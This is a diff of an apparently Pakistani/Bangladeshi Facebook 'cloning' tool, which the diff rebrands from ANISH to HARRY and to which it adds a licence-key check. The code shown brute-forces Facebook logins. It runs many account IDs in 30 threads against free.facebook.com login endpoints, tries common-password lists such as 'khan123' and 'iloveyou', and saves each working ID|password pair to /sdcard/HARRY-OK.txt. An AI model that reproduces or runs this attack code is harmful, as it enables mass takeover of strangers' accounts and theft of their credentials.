@@ -1,3 +1,8 @@
+#HARRY BRAND
+#IF YOU EVEN DECOMPYLE THIS CODE
+#DONT CALL YOURSELF HACKER 
+#ITS NOT EVEN COMPILED YET
+
 from os import path
 
 import os,base64,zlib,pip,urllib,time
@@ -95,13 +100,38 @@ logo=("""\033[1;37m
 ██║░░██║██║░░██║██║░░██║██║░░██║░░░██║░░░
 ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
 ----------------------------------------------
-
  Author    : HARRY DON
  Github    : Harryyy-XD
  Facebook  : Harry Don
  Tool Name : H-404
- 
 \033[1;37m----------------------------------------------""")
+
+try:
+    key1=open("/storage/emulated/0/android8.txt",'r').read()
+except IOError:
+    kok=open("/storage/emulated/0/android8.txt",'w')
+    myid=uuid.uuid4().hex[:12]
+    f="HARRY-404"
+    key=f+myid
+    kok.write(key)
+    kok.close()
+    print(key)
+
+a=requests.get("https://github.com/harryyy-XD/approval/blob/main/approval.txt").text
+b=str(a)
+key1=open("/storage/emulated/0/android8.txt",'r').read()
+key2=str(key1)  
+if key2 in b:
+	
+    pass     
+    
+else:
+    os.system("clear")
+    print("Your key  : "+key2)
+    print("\nContact Admin ")
+    os.system('xdg-open https://www.facebook.com/harxhshah')
+    
+    exit()
 
 def linex():
 
@@ -327,7 +357,7 @@ def public():
 
                 linex()
 
-                print('\033[1;32m exp: first last,firtslast,first123')
+                print(' First123 , Last123 , First Last')
 
                 linex()
 
@@ -343,7 +373,7 @@ def public():
 
                         print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
 
-                        print("Use flight mode for speed up")
+                        print(" Use flight mode for speed up")
 
                         linex()
 
@@ -403,7 +433,7 @@ def menu():
 
                 if x == ("sex"):
 
-                        print(' [1] File cloning\n [2] Public cloning\n [3] Contact Admin \n [0] Exit menu')
+                        print(' [1] File cloning\n [2] Public cloning (Maintainence) \n [3] Contact Admin \n [0] Exit menu')
 
                         linex()
 
@@ -457,7 +487,7 @@ def menu():
 
                                 linex()
 
-                                print('\033[1;32m exp: first last,firtslast,first123')
+                                print(' First123 , Last123 , First Last')
 
                                 linex()
 
@@ -489,7 +519,7 @@ def menu():
 
                                         print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
 
-                                        print("Use flight mode for speed up")
+                                        print(" Use flight mode for speed up")
 
                                         linex()
 
@@ -577,7 +607,7 @@ def menu():
 
                         linex()
 
-                        tks = ("Hi ANISH Sir, I Need To Buy Your Paid ANISH PRO Tools Version 2.0.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        tks = ("Hi HARRY Sir, I Need To Buy Your Paid HARRY PRO Tools Version 2.0.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
 
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
 
@@ -619,7 +649,7 @@ def pak():
 
                         user.append(nmp)
 
-                with tred(max_workers=30) as ANISH:     
+                with tred(max_workers=30) as HARRY:     
 
                         clear()
 
@@ -629,7 +659,7 @@ def pak():
 
                         print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
 
-                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
+                        print(f' Use flight mode for speed up\033[1;97m')
 
                         linex()
 
@@ -639,7 +669,7 @@ def pak():
 
                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
 
-                                ANISH.submit(rndm,ids,passlist)
+                                HARRY.submit(rndm,ids,passlist)
 
                 print('\033[1;37m')
 
@@ -679,7 +709,7 @@ def bd():
 
                         user.append(nmp)
 
-                with tred(max_workers=30) as ANISH:     
+                with tred(max_workers=30) as HARRY:     
 
                         clear()
 
@@ -689,7 +719,7 @@ def bd():
 
                         print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
 
-                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
+                        print(f' Use flight mode for speed up\033[1;97m')
 
                         linex()
 
@@ -699,7 +729,7 @@ def bd():
 
                                 passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
 
-                                ANISH.submit(rndm,ids,passlist)
+                                HARRY.submit(rndm,ids,passlist)
 
                 print('\033[1;37m')
 
@@ -777,7 +807,7 @@ def gmail():
 
                         fo = open('.re.txt', 'r').read().splitlines()
 
-                with tred(max_workers=30) as ANISH:
+                with tred(max_workers=30) as HARRY:
 
                         total = str(len(fo))
 
@@ -785,7 +815,7 @@ def gmail():
 
                         print(' Total account : \033[1;32m'+total)
 
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        print(" Use flight mode for speed up\033[1;37m")
 
                         linex()
 
@@ -809,7 +839,7 @@ def gmail():
 
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
 
-                                ANISH.submit(rndm,ids,passlist)
+                                HARRY.submit(rndm,ids,passlist)
 
                 print('\033[1;37m')
 
@@ -829,7 +859,7 @@ def ffb(ids,names,passlist):
 
         global loop,oks,cps
 
-        sys.stdout.write('\r\r\033[1;37m [ANISH-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [HARRY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 
         session = requests.Session()
 
@@ -863,9 +893,9 @@ def ffb(ids,names,passlist):
 
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 
-                        ANISH=session.cookies.get_dict().keys()
+                        HARRY=session.cookies.get_dict().keys()
 
-                        if "c_user" in ANISH:
+                        if "c_user" in HARRY:
 
                                 coki=session.cookies.get_dict()
 
@@ -873,19 +903,19 @@ def ffb(ids,names,passlist):
 
                                 print('\r\r\033[1;32m [HARRY-OK] %s | %s'%(ids,pas))
 
-                                open('/sdcard/ANISH-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/HARRY-OK.txt', 'a').write(ids+'|'+pas+'\n')
 
                                 oks.append(ids)
 
                                 break
 
-                        elif 'checkpoint' in ANISH:
+                        elif 'checkpoint' in HARRY:
 
                                 if 'y' in pcp:
 
-                                        print('\r\r\x1b[38;5;208m [ANISH-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\x1b[38;5;208m [HARRY-CP] '+ids+' | '+pas+'\033[1;97m')
 
-                                        open('/sdcard/ANISH-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/HARRY-CP.txt', 'a').write(ids+'|'+pas+'\n')
 
                                         cps.append(ids)
 
@@ -913,7 +943,7 @@ def api(ids,names,passlist):
 
                         global ok,loop
 
-                        sys.stdout.write('\r\r\033[1;37m [ANISH-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [HARRY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 
                         fn = names.split(' ')[0]
 
@@ -1015,7 +1045,7 @@ def api(ids,names,passlist):
 
                                         print('\r\r\033[1;32m [HARRY-OK] '+ids+' | '+pas+'\033[1;97m')
 
-                                        open('/sdcard/ANISH-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/HARRY-OK.txt','a').write(ids+'|'+pas+'\n')
 
                                         oks.append(ids)
 
@@ -1027,7 +1057,7 @@ def api(ids,names,passlist):
 
                                                 print('\r\r\x1b[38;5;208m [HARRY-CP] '+ids+' | '+pas+'\033[1;97m')
 
-                                                open('/sdcard/ANISH-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/HARRY-CP.txt', 'a').write(ids+'|'+pas+'\n')
 
                                                 cps.append(ids)
 
@@ -1155,7 +1185,7 @@ def api1(ids,names,passlist):
 
                                         print('\r\r\033[1;32m [HARRY-OK] '+ids+' | '+pas+'\033[1;97m')
 
-                                        open('/sdcard/ANISH-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/HARRY-OK.txt','a').write(ids+'|'+pas+'\n')
 
                                         oks.append(ids)
 
@@ -1167,7 +1197,7 @@ def api1(ids,names,passlist):
 
                                                 print('\r\r\x1b[38;5;208m [HARRY-CP] '+ids+' | '+pas+'\033[1;97m')
 
-                                                open('/sdcard/ANISH-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/HARRY-CP.txt', 'a').write(ids+'|'+pas+'\n')
 
                                                 cps.append(ids)
 
@@ -1175,7 +1205,7 @@ def api1(ids,names,passlist):
 
                                         else:
 
-                                                open('/sdcard/ANISH-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/HARRY-CP.txt','a').write(ids+'|'+pas+'\n')
 
                                                 break
 
@@ -1291,7 +1321,7 @@ def rndm(ids,passlist):
 
                                         try:
 
-                                                okk=open('/sdcard/ANISH-OK.txt','r').read()
+                                                okk=open('/sdcard/HARRY-OK.txt','r').read()
 
                                                 if uid in okk:pass
 
@@ -1299,7 +1329,7 @@ def rndm(ids,passlist):
 
                                                         print('\r\r\033[1;32m [HARRY-OK] '+uid+' | '+pas+'\033[1;97m')
 
-                                                        open('/sdcard/ANISH-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        open('/sdcard/HARRY-OK.txt','a').write(uid+'|'+pas+'\n')
 
                                                         oks.append(ids)
 
@@ -1309,7 +1339,7 @@ def rndm(ids,passlist):
 
                                                 print('\r\r\033[1;32m [HARRY-OK] '+uid+' | '+pas+'\033[1;97m')
 
-                                                open('/sdcard/ANISH-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                open('/sdcard/HARRY-OK.txt','a').write(uid+'|'+pas+'\n')
 
                                                 oks.append(ids)
 
